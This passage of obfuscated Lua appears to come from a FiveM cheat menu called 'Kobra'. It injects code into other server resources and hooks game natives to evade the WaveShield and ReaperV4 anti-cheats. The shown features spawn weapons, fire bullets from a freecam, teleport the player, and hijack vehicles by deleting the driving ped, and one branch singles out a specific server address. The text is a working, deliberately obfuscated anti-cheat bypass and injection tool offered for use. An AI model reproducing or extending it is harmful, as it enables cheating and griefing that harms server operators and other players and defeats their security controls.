                                            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                            return s
                                        end
                                        local function _g(n)
                                            local k = _d(n)
                                            local f = _G[k]
                                            return f
                                        end

                                        local function initFlow(cb)
                                            local co = coroutine.create(cb)
                                            local ok, err
                                            while coroutine.status(co) ~= "dead" do
                                                ok, err = coroutine.resume(co)
                                                if not ok then
                                                    print("WaveShield WeaponBypass error:", err)
                                                    break
                                                end
                                                Citizen.Wait(0)
                                            end
                                        end

                                        initFlow(function()
                                            local ped = %d
                                            if _g(_b("DoesEntityExist"))(ped) then
                                                local weaponName = _d({%s})
                                                local weaponHash = _g(_b("GetHashKey"))(weaponName)
                                                if weaponHash and weaponHash ~= 0 then
                                                    _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                                                    _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                                                end
                                            end
                                        end)

                                        print("Zawg")
                                    ]],v1666,v1669));Wait(350);ShootSingleBulletBetweenCoords(v1661.x,v1661.y,v1661.z,v1665.x,v1665.y,v1665.z,100,true,v1667,PlayerPedId(),true,false,51749 + 48251 );end else MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or "any" ,[[
                                    if _G.KobraFreecamObject then
                                        local function RotationToDirection(rot)
                                            local z = math.rad(rot.z)
                                            local x = math.rad(rot.x)
                                            local num = math.abs(math.cos(x))
                                            return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                        end

                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then
                                                return
                                            end

                                            _G[nativeName] = function(...)
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("RemoveWeaponFromPed", function(originalFn, ...) return end)
                                        hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                                        local camCoords = GetCamCoord(_G.KobraFreecamObject)
                                        local camRot = GetCamRot(_G.KobraFreecamObject, 2)
                                        local forward = RotationToDirection(camRot)
                                        local rayLength = 1000.0
                                        local targetPos = camCoords + forward * rayLength
                                        local playerPed = PlayerPedId()
                                        local weaponHash = GetHashKey("]]   .. v944   .. [[")

                                        GiveWeaponToPed(PlayerPedId(), weaponHash, 13500, false, true)
                                        SetCurrentPedWeapon(PlayerPedId(), weaponHash, true)
                                        ShootSingleBulletBetweenCoords(
                                            camCoords.x, camCoords.y, camCoords.z,
                                            targetPos.x, targetPos.y, targetPos.z,
                                            100,           -- damage
                                            true,          -- isAudible
                                            weaponHash,
                                            playerPed,
                                            true,          -- isInvisible
                                            false,         -- isCritical
                                            100000.0         -- speed
                                        )
                                    end
                                ]] );end elseif _G.KobraFreecamObject then local function v1543(v1610) local v1611=math.rad(v1610.z);local v1612=math.rad(v1610.x);local v1613=math.abs(math.cos(v1612));return vector3( -math.sin(v1611) * v1613 ,math.cos(v1611) * v1613 ,math.sin(v1612));end function hNative(v1614,v1615) local v1616=0 + 0 ;local v1617;while true do if ((761 -(527 + 233))==v1616) then _G[v1614]=function(...) return v1615(v1617,...);end;break;end if (v1616==(0 + 0)) then v1617=_G[v1614];if ( not v1617 or (type(v1617)~="function")) then return;end v1616=2 -1 ;end end end hNative("CreateThread",function(v1618,...) return v1618(...);end);hNative("Wait",function(v1619,...) return v1619(...);end);hNative("PlayerPedId",function(v1620,...) return v1620(...);end);hNative("GetHashKey",function(v1621,...) return v1621(...);end);hNative("GiveWeaponToPed",function(v1622,...) return v1622(...);end);hNative("SetCurrentPedWeapon",function(v1623,...) return v1623(...);end);hNative("GetCurrentPedWeapon",function(v1624,...) return v1624(...);end);hNative("RemoveWeaponFromPed",function(v1625,...) return;end);local v1544=GetCamCoord(_G.KobraFreecamObject);local v1545=GetCamRot(_G.KobraFreecamObject,2 + 0 );local v1546=v1543(v1545);local v1547=2785 -(1107 + 678) ;local v1548=v1544 + (v1546 * v1547) ;local v1549=PlayerPedId();local v1550=GetHashKey(v944);GiveWeaponToPed(v1549,v1550,210 + 45 ,false,true);MachoInjectThread(0 + 0 ,"ReaperV4","",[[
                                    local success = exports["ReaperV4"]:InvokeCPlayer("set", "Weapon:" .. ]]   .. v1550   .. [[, true, true)
                                    if success then
                                        print("Updated Cache Successfully")
                                    else
                                        print("Failed to Update Cache")
                                    end
                                ]] );Wait(300 -(4 + 46) );ShootSingleBulletBetweenCoords(v1544.x,v1544.y,v1544.z,v1548.x,v1548.y,v1548.z,377 -277 ,true,v1550,v1549,true,false,183879 -83879 );end break;end if ((0 + 0)==v1304) then v33=v944;print(("weapon: %s, LastWeaponFired: %s"):format(v944,v33));v1304=1 -0 ;end end elseif ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then if (GetResourceState("WaveShield")=="started") then if _G.KobraFreecamObject then print("UPP3R");local function v1521(v1551) local v1552=0;local v1553;local v1554;local v1555;while true do if (v1552==1) then v1555=math.abs(math.cos(v1554));return vector3( -math.sin(v1553) * v1555 ,math.cos(v1553) * v1555 ,math.sin(v1554));end if (v1552==(0 -0)) then v1553=math.rad(v1551.z);v1554=math.rad(v1551.x);v1552=1;end end end function hNative(v1556,v1557) local v1558=_G[v1556];if ( not v1558 or (type(v1558)~="function")) then return;end _G[v1556]=function(...) return v1557(v1558,...);end;end hNative("CreateThread",function(v1559,...) return v1559(...);end);hNative("Wait",function(v1560,...) return v1560(...);end);hNative("PlayerPedId",function(v1561,...) return v1561(...);end);hNative("GetHashKey",function(v1562,...) return v1562(...);end);hNative("GiveWeaponToPed",function(v1563,...) return v1563(...);end);hNative("SetCurrentPedWeapon",function(v1564,...) return v1564(...);end);hNative("GetCurrentPedWeapon",function(v1565,...) return v1565(...);end);hNative("RemoveWeaponFromPed",function(v1566,...) return;end);hNative("ShootSingleBulletBetweenCoords",function(v1567,...) return v1567(...);end);local v1522=GetCamCoord(_G.KobraFreecamObject);local v1523=GetCamRot(_G.KobraFreecamObject,2);local v1524=v1521(v1523);local v1525=2396 -(1262 + 134) ;local v1526=v1522 + (v1524 * v1525) ;local v1527=PlayerPedId();local v1528=GetHashKey(v944);local function v1529(v1568) local v1569=0 -0 ;local v1570;while true do if (v1569==(0 + 0)) then v1570={};for v1737=1 + 0 , #v1568 do v1570[v1737]=string.byte(v1568,v1737);end v1569=796 -(383 + 412) ;end if (v1569==1) then return table.concat(v1570,",");end end end local v1530=v1529(v944);v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,string.format([[
                                        if not _G.osintWeaponBypass then
                                            _G.osintWeaponBypass = { enabled = false }
                                        end
                                        _G.osintWeaponBypass.enabled = true

                                        local function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                        end

                                        hNative("GetHashKey", function(orig, str) return orig(str) end)
                                        hNative("GiveWeaponToPed", function(orig, ped, hash, ammo, isHidden, equipNow)
                                            if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                                                return orig(ped, hash, ammo, false, true)
                                            else
                                                return orig(ped, hash, ammo, isHidden, equipNow)
                                            end
                                        end)
                                        hNative("SetCurrentPedWeapon", function(orig, ped, hash, equipNow)
                                            if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                                                return orig(ped, hash, true)
                                            else
                                                return orig(ped, hash, equipNow)
                                            end
                                        end)

                                        local function _b(str)
                                            local t = {}
                                            for i = 1, #str do t[i] = string.byte(str, i) end
                                            return t
                                        end
                                        local function _d(tbl)
                                            local s = ""
                                            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                            return s
                                        end
                                        local function _g(n)
                                            local k = _d(n)
                                            local f = _G[k]
                                            return f
                                        end

                                        local function initFlow(cb)
                                            local co = coroutine.create(cb)
                                            local ok, err
                                            while coroutine.status(co) ~= "dead" do
                                                ok, err = coroutine.resume(co)
                                                if not ok then
                                                    print("WaveShield WeaponBypass error:", err)
                                                    break
                                                end
                                                Citizen.Wait(0)
                                            end
                                        end

                                        initFlow(function()
                                            local ped = %d
                                            if _g(_b("DoesEntityExist"))(ped) then
                                                local weaponName = _d({%s})
                                                local weaponHash = _g(_b("GetHashKey"))(weaponName)
                                                if weaponHash and weaponHash ~= 0 then
                                                    _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                                                    _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                                                end
                                            end
                                        end)

                                        print("Zawg")
                                    ]],v1527,v1530));Wait(118 + 32 );ShootSingleBulletBetweenCoords(v1522.x,v1522.y,v1522.z,v1526.x,v1526.y,v1526.z,8 + 92 ,true,v1528,v1527,true,false,45614 + 54386 );end else MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or "any" ,[[
                                    if _G.KobraFreecamObject then
                                        local function RotationToDirection(rot)
                                            local z = math.rad(rot.z)
                                            local x = math.rad(rot.x)
                                            local num = math.abs(math.cos(x))
                                            return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                        end

                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then
                                                return
                                            end

                                            _G[nativeName] = function(...)
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("RemoveWeaponFromPed", function(originalFn, ...) return end)
                                        hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                                        local camCoords = GetCamCoord(_G.KobraFreecamObject)
                                        local camRot = GetCamRot(_G.KobraFreecamObject, 2)
                                        local forward = RotationToDirection(camRot)
                                        local rayLength = 1000.0
                                        local targetPos = camCoords + forward * rayLength
                                        local playerPed = PlayerPedId()
                                        local weaponHash = GetHashKey("]]   .. v944   .. [[")

                                        ShootSingleBulletBetweenCoords(
                                            camCoords.x, camCoords.y, camCoords.z,
                                            targetPos.x, targetPos.y, targetPos.z,
                                            100,           -- damage
                                            true,          -- isAudible
                                            weaponHash,
                                            playerPed,
                                            true,          -- isInvisible
                                            false,         -- isCritical
                                            100000.0         -- speed
                                        )
                                    end
                                ]] );end elseif _G.KobraFreecamObject then local v1438=0 + 0 ;local v1439;local v1440;local v1441;local v1442;local v1443;local v1444;local v1445;local v1446;while true do if (v1438==(1 + 0)) then hNative("CreateThread",function(v1626,...) return v1626(...);end);hNative("Wait",function(v1627,...) return v1627(...);end);hNative("PlayerPedId",function(v1628,...) return v1628(...);end);v1438=2;end if (v1438==(2 -0)) then hNative("GetHashKey",function(v1629,...) return v1629(...);end);hNative("GiveWeaponToPed",function(v1630,...) return v1630(...);end);hNative("SetCurrentPedWeapon",function(v1631,...) return v1631(...);end);v1438=3 + 0 ;end if (v1438==(0 -0)) then v1439=nil;function v1439(v1632) local v1633=0 -0 ;local v1634;local v1635;local v1636;while true do if (v1633==0) then v1634=math.rad(v1632.z);v1635=math.rad(v1632.x);v1633=2 -1 ;end if (v1633==1) then v1636=math.abs(math.cos(v1635));return vector3( -math.sin(v1634) * v1636 ,math.cos(v1634) * v1636 ,math.sin(v1635));end end end function hNative(v1637,v1638) local v1639=0 + 0 ;local v1640;while true do if (v1639==(707 -(667 + 40))) then v1640=_G[v1637];if ( not v1640 or (type(v1640)~="function")) then return;end v1639=1;end if (v1639==(1311 -(436 + 874))) then _G[v1637]=function(...) return v1638(v1640,...);end;break;end end end v1438=1607 -(762 + 844) ;end if ((4 -1)==v1438) then hNative("GetCurrentPedWeapon",function(v1641,...) return v1641(...);end);hNative("RemoveWeaponFromPed",function(v1642,...) return;end);v1440=GetCamCoord(_G.KobraFreecamObject);v1438=8 -4 ;end if (v1438==(1 + 3)) then v1441=GetCamRot(_G.KobraFreecamObject,1 + 1 );v1442=v1439(v1441);v1443=1000;v1438=481 -(209 + 267) ;end if (v1438==6) then GiveWeaponToPed(PlayerPedId(),v1446,458 -208 ,false,true);SetCurrentPedWeapon(PlayerPedId(),v1446,true);ShootSingleBulletBetweenCoords(v1440.x,v1440.y,v1440.z,v1444.x,v1444.y,v1444.z,281 -181 ,true,v1446,v1445,true,false,101711 -(1611 + 100) );break;end if (v1438==(4 + 1)) then v1444=v1440 + (v1442 * v1443) ;v1445=PlayerPedId();v1446=GetHashKey(v944);v1438=6;end end end break;end if (v943==0) then v944=v36[v34];if (v944=="WEAPON_PERMKILL") then v944="WEAPON_TRANQUILIZER";elseif (v944=="WEAPON_RPG_2") then v944="WEAPON_AIRSTRIKE_ROCKET";end v943=785 -(14 + 770) ;end end end end if IsDisabledControlJustPressed(1784 -(1165 + 619) ,37 -13 ) then local v829=v648;if (v829=="Teleport") then if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then if (GetResourceState("WaveShield")=="started") then if _G.KobraFreecamObject then local v1343=381 -(229 + 152) ;local v1344;local v1345;local v1346;local v1347;local v1348;local v1349;local v1350;local v1351;local v1352;local v1353;local v1354;while true do if (v1343==1) then v1346=GetCamRot(_G.KobraFreecamObject,196 -(107 + 87) );v1347=v1344(v1346);v1348=1817 -817 ;v1349=v1345 + (v1347 * v1348) ;v1343=1 + 1 ;end if (v1343==(0 + 0)) then v1344=nil;function v1344(v1456) local v1457=math.rad(v1456.z);local v1458=math.rad(v1456.x);local v1459=math.abs(math.cos(v1458));return vector3( -math.sin(v1457) * v1459 ,math.cos(v1457) * v1459 ,math.sin(v1458));end function GetEmptySeat(v1460) local v1461={ -1,0 -0 ,1,2};for v1531,v1532 in ipairs(v1461) do if IsVehicleSeatFree(v1460,v1532) then return v1532;end end return  -(1 + 0);end v1345=GetCamCoord(_G.KobraFreecamObject);v1343=15 -(13 + 1) ;end if (v1343==(2 + 0)) then v1350=StartShapeTestRay(v1345.x,v1345.y,v1345.z,v1349.x,v1349.y,v1349.z, -(1 + 0),PlayerPedId(),1058 -(987 + 71) );v1351,v1352,v1353,v1351,v1354=GetShapeTestResult(v1350);if v1352 then if ((v1354~=(0 -0)) and IsEntityAVehicle(v1354)) then local v1643=0 -0 ;local v1644;local v1645;local v1646;while true do if (v1643==1) then v1646=GetEmptySeat(v1644);if (v1646== -(700 -(514 + 185))) then TaskWarpPedIntoVehicle(v1645,v1644, -(1 + 0));elseif (v1646>=0) then TaskWarpPedIntoVehicle(v1645,v1644,v1646);else print("[^5SYNC^7]: There aren't any seats available in this vehicle.");end break;end if (v1643==0) then v1644=v1354;v1645=PlayerPedId();v1643=1 -0 ;end end else SetEntityCoords(PlayerPedId(),v1353.x,v1353.y,v1353.z,false,false,false,false);end else print("[^5SYNC^7]: There aren't any valid locations to teleport to.");end break;end end end else MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or "any" ,[[
                                if _G.KobraFreecamObject then
                                    local function RotationToDirection(rot)
                                        local z = math.rad(rot.z)
                                        local x = math.rad(rot.x)
                                        local num = math.abs(math.cos(x))
                                        return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                    end

                                    function GetEmptySeat(vehicle)
                                        local seats = {
                                            -1, 0, 1, 2
                                        }

                                        for _, seat in ipairs(seats) do
                                            if IsVehicleSeatFree(vehicle, seat) then
                                                return seat
                                            end
                                        end

                                        return -1
                                    end

                                    function hNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then
                                            return
                                        end

                                        _G[nativeName] = function(...)
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    hNative("RotationToDirection", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetEmptySeat", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                    hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                    hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetEntityCoordsWithoutPlantsReset", function(originalFn, ...) return originalFn(...) end)

                                    local camCoords = GetCamCoord(_G.KobraFreecamObject)
                                    local rot = GetCamRot(_G.KobraFreecamObject, 2)
                                    local forward = RotationToDirection(rot)
                                    local rayLength = 1000.0
                                    local targetPos = camCoords + forward * rayLength
                                    local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, PlayerPedId(), 0)
                                    local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                                    if hit then
                                        if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                            local vehicle = entityHit
                                            local playerPed = PlayerPedId()
                                            local seat = GetEmptySeat(vehicle)
                                            if seat == -1 then
                                                TaskWarpPedIntoVehicle(playerPed, vehicle, -1)
                                            elseif seat >= 0 then
                                                TaskWarpPedIntoVehicle(playerPed, vehicle, seat)
                                            else
                                                print("[^5Kobra^7]: There aren't any seats available in this vehicle.")
                                            end
                                        else
                                            SetEntityCoordsWithoutPlantsReset(PlayerPedId(), endCoords.x, endCoords.y, endCoords.z, false, false, false, false)
                                        end
                                    else
                                        print("[^5Kobra^7]: There aren't any valid locations to teleport to.")
                                    end
                                end
                            ]]);end elseif _G.KobraFreecamObject then local function v1225(v1305) local v1306=0;local v1307;local v1308;local v1309;while true do if (v1306==(3 -2)) then v1309=math.abs(math.cos(v1308));return vector3( -math.sin(v1307) * v1309 ,math.cos(v1307) * v1309 ,math.sin(v1308));end if (v1306==(1504 -(771 + 733))) then v1307=math.rad(v1305.z);v1308=math.rad(v1305.x);v1306=1;end end end function GetEmptySeat(v1310) local v1311=0 -0 ;local v1312;while true do if ((0 -0)==v1311) then v1312={ -1,1167 -(407 + 760) ,1 + 0 ,2};for v1447,v1448 in ipairs(v1312) do if IsVehicleSeatFree(v1310,v1448) then return v1448;end end v1311=1;end if (v1311==(1 + 0)) then return  -1;end end end local v1226=GetCamCoord(_G.KobraFreecamObject);local v1227=GetCamRot(_G.KobraFreecamObject,2);local v1228=v1225(v1227);local v1229=1000;local v1230=v1226 + (v1228 * v1229) ;local v1231=StartShapeTestRay(v1226.x,v1226.y,v1226.z,v1230.x,v1230.y,v1230.z, -(1 + 0),PlayerPedId(),1854 -(169 + 1685) );local v1232,v1233,v1234,v1232,v1235=GetShapeTestResult(v1231);if v1233 then if ((v1235~=0) and IsEntityAVehicle(v1235)) then local v1414=0;local v1415;local v1416;local v1417;while true do if (v1414==(1 + 0)) then v1417=GetEmptySeat(v1415);if (v1417== -(392 -(41 + 350))) then TaskWarpPedIntoVehicle(v1416,v1415, -1);elseif (v1417>=(0 -0)) then TaskWarpPedIntoVehicle(v1416,v1415,v1417);else print("[^5Kobra^7]: There aren't any seats available in this vehicle.");end break;end if ((0 -0)==v1414) then v1415=v1235;v1416=PlayerPedId();v1414=4 -3 ;end end else MachoInjectThread(0 -0 ,"any","",[[ 
                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then
                                                return
                                            end

                                            _G[nativeName] = function(...)
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        hNative("RotationToDirection", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetRightVector", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Clamp", function(originalFn, ...) return originalFn(...) end)
                                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                        hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                                        hNative("DoesCamExist", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                                        hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                                        hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextFont", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextProportional", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextScale", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextDropShadow", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextEdge", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextOutline", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextCentre", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextColour", function(originalFn, ...) return originalFn(...) end)
                                        hNative("BeginTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                                        hNative("AddTextComponentSubstringPlayerName", function(originalFn, ...) return originalFn(...) end)
                                        hNative("EndTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                                        hNative("TaskStandStill", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                                        hNative("StartExpensiveSynchronousShapeTestLosProbe", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsDisabledControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                        hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                                        SetEntityCoords(PlayerPedId(), ]]   .. v1234.x   .. [[, ]]   .. v1234.y   .. [[, ]]   .. v1234.z   .. [[, false, false, false, false)
                                    ]] );end else print("[^5Kobra^7]: There aren't any valid locations to teleport to.");end end elseif (v829=="Kick from Vehicle") then if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then local v1236=0 + 0 ;local v1237;while true do if (v1236==0) then v1237=((GetResourceState("lb-phone")=="started") and "lb-phone") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ;v48(v1237,[[
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end
                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                            local function RequestControl(entity, timeoutMs)
                                timeoutMs = timeoutMs or 2000
                                local start = GetGameTimer()

                                while (GetGameTimer() - start) < timeoutMs do
                                    if NetworkHasControlOfEntity(entity) then return true end
                                    NetworkRequestControlOfEntity(entity)
                                    Wait(0)
                                end

                                return NetworkHasControlOfEntity(entity)
                            end

                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            function GetEmptySeat(vehicle)
                                local seats = { -1, 0, 1, 2 }

                                for _, seat in ipairs(seats) do
                                    if IsVehicleSeatFree(vehicle, seat) then
                                        return seat
                                    end
                                end

                                return -1
                            end

                            local player = PlayerPedId()
                            local oldCoords = GetEntityCoords(player)
                            local camCoords = GetCamCoord(_G[FLAG_CAM])
                            local rot = GetCamRot(_G[FLAG_CAM], 2)
                            local forward = RotationToDirection(rot)
                            local rayLength = 1000.0
                            local targetPos = camCoords + forward * rayLength
                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, player, 0)
                            local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                            local function HijackCar(vehicle)
                                if not vehicle or not DoesEntityExist(vehicle) then
                                    return
                                end

                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                if driver ~= 0 and DoesEntityExist(driver) then
                                    SetPedIntoVehicle(player, vehicle, 0)
                                    RequestControl(vehicle, 2000)
                                    Wait(10)

                                    for i = 0, 4 do
                                        DeletePed(driver)
                                    end

                                    Wait(40)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(450)
                                    ClearPedTasksImmediately(player)
                                    SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                                    Wait(100)
                                end
                            end

                            CreateThread(function()
                                if hit then
                                    if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        local vehicle = entityHit

                                        HijackCar(vehicle)
                                    end
                                end
                            end)
                        ]]);break;end end elseif _G.KobraFreecamObject then local v1355=887 -(790 + 97) ;local v1356;local v1357;local v1358;local v1359;local v1360;local v1361;local v1362;local v1363;local v1364;local v1365;local v1366;local v1367;local v1368;local v1369;local v1370;while true do if (v1355==0) then function hNative(v1462,v1463) local v1464=_G[v1462];if ( not v1464 or (type(v1464)~="function")) then return;end _G[v1462]=function(...) return v1463(v1464,...);end;end hNative("CreateThread",function(v1465,...) return v1465(...);end);hNative("Wait",function(v1466,...) return v1466(...);end);hNative("DoesEntityExist",function(v1467,...) return v1467(...);end);v1355=1;end if (v1355==(18 -14)) then hNative("PlayerPedId",function(v1468,...) return v1468(...);end);hNative("NetworkRequestControlOfEntity",function(v1469,...) return v1469(...);end);hNative("NetworkHasControlOfEntity",function(v1470,...) return v1470(...);end);v1356=nil;v1355=2 + 3 ;end if (v1355==(1 + 0)) then hNative("GetEntityCoords",function(v1471,...) return v1471(...);end);hNative("GetCamCoord",function(v1472,...) return v1472(...);end);hNative("GetCamRot",function(v1473,...) return v1473(...);end);hNative("StartShapeTestRay",function(v1474,...) return v1474(...);end);v1355=247 -(235 + 10) ;end if (v1355==(3 + 0)) then hNative("ClearPedTasksImmediately",function(v1475,...) return v1475(...);end);hNative("SetEntityCoordsNoOffset",function(v1476,...) return v1476(...);end);hNative("IsEntityAVehicle",function(v1477,...) return v1477(...);end);hNative("SetPedIntoVehicle",function(v1478,...) return v1478(...);end);v1355=4;end if (v1355==6) then v1358=PlayerPedId();v1359=GetEntityCoords(v1358);v1360=GetCamCoord(_G.KobraFreecamObject);v1361=GetCamRot(_G.KobraFreecamObject,3 -1 );v1355=1190 -(887 + 296) ;end if (v1355==(1050 -(512 + 533))) then function v1356(v1479,v1480) v1480=v1480 or 2000 ;local v1481=GetGameTimer();while 